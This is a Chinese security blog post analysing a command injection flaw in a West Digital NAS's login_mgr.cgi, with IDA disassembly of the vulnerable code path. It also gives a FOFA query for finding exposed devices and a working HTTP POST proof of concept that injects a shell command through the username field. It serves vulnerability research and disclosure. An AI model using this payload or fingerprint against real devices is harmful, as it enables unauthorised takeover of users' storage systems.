---
title: "西部数码 NAS  login_mgr.cgi 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-login_mgr-rce.html
asset_dir: assets/西部数码-nas-login_mgr.cgi-命令执行漏洞
---

# 西部数码 NAS login\_mgr.cgi 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/1 16:25
- 503浏览
- [0评论](#comment)
- 41分钟阅读

深入探索

操作系统

软件

脚本语言

---

# 漏洞简介

西部数码NAS（网络附加存储）是西部数码提供的存储解决方案，旨在为用户提供便捷的文件存储、备份和共享服务。

漏洞扫描服务

西部数码NAS的`login_mgr.cgi`[脚本](#)存在多处[命令执行](https://mrxn.net/tag/rce)漏洞。该脚本在处理SNMP管理相关请求时，可能由于未对用户输入进行充分的过滤和验证，直接将用户提供的参数传递给系统命令执行函数或拼接进命令执行语句里。攻击者可以通过构造恶意的请求参数，注入[操作系统](#)命令，从而在服务器上[执行任意命令](https://mrxn.net/tag/rce)。

该漏洞可能导致攻击者完全控制NAS服务器，窃取存储在NAS上的敏感数据，篡改文件，植入恶意[软件](#)，甚至将NAS作为跳板攻击内网其他系统，对用户的数据安全和网络安全造成严重威胁。

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"

# 漏洞分析

直接用 IDA 加载 login\_mgr.cgi 文件后，搜索进入漏洞点

数据备份与恢复

[![西部数码 NAS  login_mgr.cgi 命令执行漏洞](images/img-001-f482b3ce09a6.webp)](https://image.mrxn.net/d1ea9c8b12a74437853c16c73360e619.webp)

如果`cmd=wd_login` 就跳转进入`loc_B448`

深入探索

文件大小转换

网络安全会议

技术文章订阅

[![西部数码 NAS  login_mgr.cgi 命令执行漏洞](images/img-002-96ff834e6c13.webp)](https://image.mrxn.net/acd0c501c8634107ad6547dc6e6a9edb.webp)

继续跟进 `sub_A1E0`

```
sub_A1E0

var_10FC= -0x10FC
var_10F8= -0x10F8
var_10F4= -0x10F4
var_10F0= -0x10F0
var_10EC= -0x10EC
var_10E8= -0x10E8
var_10E4= -0x10E4
var_10E0= -0x10E0
var_10DC= -0x10DC
var_10A8= -0x10A8
var_ED8= -0xED8
var_CE0= -0xCE0
var_AE0= -0xAE0
var_8E0= -0x8E0
var_8D8= -0x8D8
var_6E0= -0x6E0
var_6D8= -0x6D8
var_4E0= -0x4E0
var_4D8= -0x4D8
var_2E0= -0x2E0
var_100= -0x100
var_C0= -0xC0
var_80= -0x80
var_40= -0x40

PUSH    {R4-R11,LR}
SUB     SP, SP, #0x10C0
SUB     SP, SP, #0x1C
MOV     R5, #0
ADD     R3, SP, #0x1100+var_100
ADD     R0, SP, #0x1100+var_100
STR     R5, [R3,#0xA8]
STR     R5, [R3,#0xAC]
STR     R5, [R3,#0xB0]
STR     R5, [R3,#0xB4]
STR     R5, [R3,#0xB8]
STR     R5, [R3,#0xBC]
STR     R5, [R3,#0xC0]
STR     R5, [R3,#0xC4]
STR     R5, [R3,#0x88]
STR     R5, [R3,#0x8C]
STR     R5, [R3,#0x90]
STR     R5, [R3,#0x94]
STR     R5, [R3,#0x98]
STR     R5, [R3,#0x9C]
STR     R5, [R3,#0xA0]
STR     R5, [R3,#0xA4]
MOV     R1, R5          ; c
MOV     R2, #0x40 ; '@' ; n
ADD     R0, R0, #0x28 ; '(' ; s
BL      memset
ADD     R8, SP, #0x1100+var_4E0
ADD     R12, SP, #0x1100+var_100
ADD     R0, SP, #0x1100+var_2E0
STR     R5, [R12,#0xD0]
STR     R5, [R12,#0xD4]
STR     R5, [R12,#0xC8]
STR     R5, [R12,#0xCC]
MOV     R1, R5          ; c
MOV     R2, #0x200      ; n
ADD     R8, R8, #8
ADD     R0, R0, #8      ; s
ADD     R10, SP, #0x1100+var_6E0
BL      memset
ADD     R10, R10, #8
MOV     R1, R5          ; c
MOV     R2, #0x200      ; n
MOV     R0, R8          ; s
ADD     R9, SP, #0x1100+var_8E0
BL      memset
ADD     R9, R9, #8
MOV     R1, R5          ; c
MOV     R2, #0x200      ; n
MOV     R0, R10         ; s
BL      memset
MOV     R1, R5          ; c
MOV     R2, #0x200      ; n
MOV     R0, R9          ; s
BL      memset
ADD     R0, SP, #0x1100+var_AE0
MOV     R1, R5          ; c
MOV     R2, #0x200      ; n
ADD     R0, R0, #8      ; s
BL      memset
ADD     R0, SP, #0x1100+var_CE0
MOV     R1, R5          ; c
MOV     R2, #0x200      ; n
ADD     R11, SP, #0x1100+var_ED8
ADD     R0, R0, #8      ; s
ADD     R7, SP, #0x1100+var_10A8
BL      memset
SUB     R7, R7, #0x30 ; '0'
MOV     R1, R5          ; c
MOV     R2, #0x200      ; n
MOV     R0, R11         ; s
BL      memset
MOV     R2, #0x200      ; n
MOV     R1, R5          ; c
MOV     R0, R7          ; s
BL      memset
ADD     R1, SP, #0x1100+var_100
STR     R5, [R1,#0x68]
STR     R5, [R1,#0x6C]
STR     R5, [R1,#0x70]
STR     R5, [R1,#0x74]
STR     R5, [R1,#0x78]
STR     R5, [R1,#0x7C]
STR     R5, [R1,#0x80]
STR     R5, [R1,#0x84]
MOV     R0, R5          ; timer
BL      time
ADD     R4, SP, #0x1100+var_80
ADD     R1, SP, #0x1100+var_80
ADD     R4, R4, #8
ADD     R1, R1, #0x28 ; '('
MOV     R2, #0x20 ; ' '
STR     R0, [SP,#0x1100+var_10F4]
LDR     R0, =aUsername  ; "username"
BL      cgiFormString
MOV     R2, #0x20 ; ' '
MOV     R1, R4
LDR     R0, =aPwd       ; "pwd"
BL      cgiFormString
ADD     R0, SP, #0x1100+var_100
ADD     R0, R0, #0x28 ; '(' ; u_char *
MOV     R1, R4          ; char *
MOV     R2, #0x20 ; ' '
BL      sub_BD60
ADD     R0, SP, #0x1100+var_80
ADD     R0, R0, #0x28 ; '(' ; s
MOV     R1, #0x5C ; '\' ; c
BL      index
CMP     R0, #0
BEQ     loc_AB38
```

在 `0xA388` 处检查 `username` 是否包含 `\` 字符。如果包含，则取 `\` 之后的部分作为待拼接的字符串（`R2` 寄存器）。随后，在 `0xA3A4` 处，该字符串被 `sprintf` 函数直接格式化到 `net ads search -P '(... sAMAccountName=%s ...)'` 命令字符串中。

脚本语言

[![西部数码 NAS  login_mgr.cgi 命令执行漏洞](images/img-003-66bdb52bf616.webp)](https://image.mrxn.net/2ca3b0a508894089ae8bfe38535e5be3.webp)

[![西部数码 NAS  login_mgr.cgi 命令执行漏洞](images/img-004-6936d6a3564b.webp)](https://image.mrxn.net/0428df5a12014be4b32176cb9c177e0a.webp)

最终拼接成的完整命令字符串，在 `0xA3B4` 处被传递给 `popen` 函数执行。`popen` 会创建一个新的 shell 进程来[执行该命令](https://mrxn.net/tag/rce)。

# 漏洞复现

[![西部数码 NAS  login_mgr.cgi 命令执行漏洞](images/img-005-96537bc7c062.webp)](https://image.mrxn.net/aa50b1a7f8914d23a919c88425d1420f.webp)

```
POST /cgi-bin/login_mgr.cgi HTTP/1.1
Host: west-nas.mrxn.net
Content-Type: application/x-www-form-urlencoded

cmd=wd_login&username=\admin'$(id>/var/www/t.png)'&pwd=123456
```

[![西部数码 NAS  login_mgr.cgi 命令执行漏洞](images/img-006-fff0ef2e6e7f.webp)](https://image.mrxn.net/ee20ac11d54d435ca21dd3a547843568.webp)

成功[执行id命令](https://mrxn.net/tag/rce)并写入文件

漏洞扫描服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
